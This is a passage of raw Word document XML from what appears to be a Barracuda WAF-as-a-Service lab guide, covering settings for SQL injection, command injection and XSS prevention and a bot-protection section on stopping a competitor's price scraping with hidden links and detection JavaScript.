          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B2A793D" w14:textId="5C546131" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>SQL injection attack allows commands to be executed directly against the database, allowing disclosure and modification of data in the database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D68893D" w14:textId="10F13C7E" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Enable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C9C3045" w14:textId="53571FEE" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CDC1813" w14:textId="22455FEA" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Parameter Protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44BEACE2" w14:textId="54F3D22B" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>App Profiles</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="25D3FDD1" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6F9ED480" w14:textId="652A1A11" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
              <w:t>OS Command Injection Prevention</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5DB56252" w14:textId="05333AEF" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>OS commands can often be used to give attackers access to data and escalate privileges on servers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FF9166E" w14:textId="0426F28C" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Enable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0A1DED41" w14:textId="53571FEE" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="31F0552B">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Protection</w:t>
            </w:r>
            <w:commentRangeStart w:id="32"/>
            <w:commentRangeEnd w:id="32"/>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="CommentReference"/>
              </w:rPr>
              <w:commentReference w:id="32"/>
            </w:r>
          </w:p>
          <w:p w14:paraId="74DCB7AD" w14:textId="22455FEA" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Parameter Protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39B50EBA" w14:textId="54F3D22B" w:rsidR="2CB572AA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10BDAD0A" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>App Profiles</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2985A59E" w14:textId="6209C4F6" w:rsidR="10B611DA" w:rsidRPr="00BB5FA4" w:rsidRDefault="10B611DA" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="729EF4FC" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1706794B" w14:textId="4BEE8378" w:rsidR="31A50A09" w:rsidRPr="00BB5FA4" w:rsidRDefault="0BAC9B98" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
              <w:t>XSS Injection Prevention</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="66304359" w14:textId="7E6EA169" w:rsidR="31A50A09" w:rsidRPr="00BB5FA4" w:rsidRDefault="0BAC9B98" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Cross-Site Scripting (XSS) takes advantage of a vulnerable Web site to attack clients who visit that Web site</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4767E987" w14:textId="7E1395AA" w:rsidR="31A50A09" w:rsidRPr="00BB5FA4" w:rsidRDefault="0BAC9B98" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Enable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="485CB3D5" w14:textId="53571FEE" w:rsidR="31A50A09" w:rsidRPr="00BB5FA4" w:rsidRDefault="0BAC9B98" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:commentRangeStart w:id="34"/>
            <w:r w:rsidRPr="31F0552B">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0697D034" w14:textId="22455FEA" w:rsidR="31A50A09" w:rsidRPr="00BB5FA4" w:rsidRDefault="0BAC9B98" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Parameter Protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="582FA0A5" w14:textId="7AA46685" w:rsidR="31A50A09" w:rsidRPr="00BB5FA4" w:rsidRDefault="0BAC9B98" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="31F0552B">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>App Profiles</w:t>
            </w:r>
            <w:commentRangeEnd w:id="34"/>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="CommentReference"/>
              </w:rPr>
              <w:commentReference w:id="34"/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="37767754" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2182A8D0" w14:textId="54B51960" w:rsidR="00A3AC4F" w:rsidRPr="00BB5FA4" w:rsidRDefault="4EB6CFBD" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
              <w:t>Default Character Set</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7A08EA8A" w14:textId="6FA19A16" w:rsidR="00A3AC4F" w:rsidRPr="00BB5FA4" w:rsidRDefault="4EB6CFBD" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>This affects how incoming requests are decoded before inspection. The Default Character Set is used when the charset cannot be determined by other means</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B8DEBC0" w14:textId="6F47B1DD" w:rsidR="00A3AC4F" w:rsidRPr="00BB5FA4" w:rsidRDefault="4EB6CFBD" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>UTF-8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="14ECB71D" w14:textId="1E152740" w:rsidR="3B42D39E" w:rsidRPr="00BB5FA4" w:rsidRDefault="4467BA10" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>URL Normalization</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="10B611DA" w14:paraId="54AA500A" w14:textId="77777777" w:rsidTr="31F0552B">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1965" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24E92C07" w14:textId="094370BA" w:rsidR="3B42D39E" w:rsidRPr="00BB5FA4" w:rsidRDefault="4467BA10" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:val="it-IT"/>
              </w:rPr>
              <w:t>Suppress Server Errors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3810" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E2A580C" w14:textId="274045D0" w:rsidR="3B42D39E" w:rsidRPr="00BB5FA4" w:rsidRDefault="4467BA10" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Enables the Barracuda Web Application Firewall to insert a default or custom response page in case of any error responses from the server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="945" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="200C1F3B" w14:textId="71992498" w:rsidR="3B42D39E" w:rsidRPr="00BB5FA4" w:rsidRDefault="4467BA10" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Yes</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2771" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30C0C018" w14:textId="4BC13600" w:rsidR="3B42D39E" w:rsidRPr="00BB5FA4" w:rsidRDefault="4467BA10" w:rsidP="00BB5FA4">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BB5FA4">
              <w:rPr>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>Response Cloaking</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="425419EF" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641"/>
    <w:p w14:paraId="06C90BB8" w14:textId="2069DCE4" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641"/>
    <w:p w14:paraId="184BE6B4" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641"/>
    <w:p w14:paraId="69D33B0D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc72791981"/>
      <w:bookmarkStart w:id="37" w:name="_Toc59170533"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Bot Protection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="678D5E2D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRPr="00D5628E" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:r>
        <w:t xml:space="preserve">There are some good Bots such as search engines.  But did you know that up to </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">82% of </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t>ot traffic is from malicious bots that attack user accounts</w:t>
      </w:r>
      <w:r>
        <w:t>?  These Bots</w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve"> skew analytics, scrape your confidential data</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, lock up your inventory, </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">generally impact </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t>your customer experience.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00D5628E">
        <w:t>Minimize the risk of data breaches, reputational damage and financial disasters</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> by deploying WAF-as-a-Service Bot Protection components.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3562D93D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc72791982"/>
      <w:r>
        <w:t>Web Scraping Attack Prevention</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="2C34BA6D" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="Quote"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Our competitor, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>TerribleStore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>, started selling the same things and whenever we change our prices, their prices are almost immediately 1 cent cheaper than ours!  How do they do that?  How do we stop them?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE0A316" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The competitor is using a Web Scraper to scrape our customer’s price list. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DDD8BBD" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Add the </w:t>
      </w:r>
      <w:r w:rsidRPr="00B52CC8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Distributed Denial-of-Service</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> component.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2746982B" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click on the </w:t>
      </w:r>
      <w:r w:rsidRPr="00B52CC8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>DDOS Component</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to expand the List of sub-components</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A488089" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Choose </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Web Scraping</w:t>
      </w:r>
      <w:r>
        <w:t>, turn on “</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>insert hidden links</w:t>
      </w:r>
      <w:r>
        <w:t>” and “</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>insert JavaScript</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">” and click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Save</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5B6FE7DF" wp14:editId="6F1F45A7">
            <wp:extent cx="3699966" cy="20077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699966" cy="2007705"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A77FC96" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Hidden Links and Bot-detecting JavaScript are both inserted into the web page as it passes outbound through WAF-as-a-Service Page on the way to the Browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5821C0C9" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="21EDC500" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Here is a Before &amp; After view of the page source showing the technologies WAF-as-a-Service has inserted into the web page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39AB4CA5" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Before the Web Scraping protection, we see just a plain web page.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1DC015B3" wp14:editId="6D0D3B95">
            <wp:extent cx="5019676" cy="16313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019676" cy="1631394"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA81FE4" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="26"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>After the Web Scraping Protection, notice the hidden links and the JavaScript which helps determine if the client is a Bot or a Human.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2FB3AEE1" wp14:editId="1B48A902">
            <wp:extent cx="5040570" cy="156948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570" cy="1569488"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D887F34" wp14:editId="0884C0B1">
            <wp:extent cx="5047584" cy="3498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047584" cy="349885"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDC78BE" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc852924758"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5411083C" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="002D2B05">
      <w:pPr>
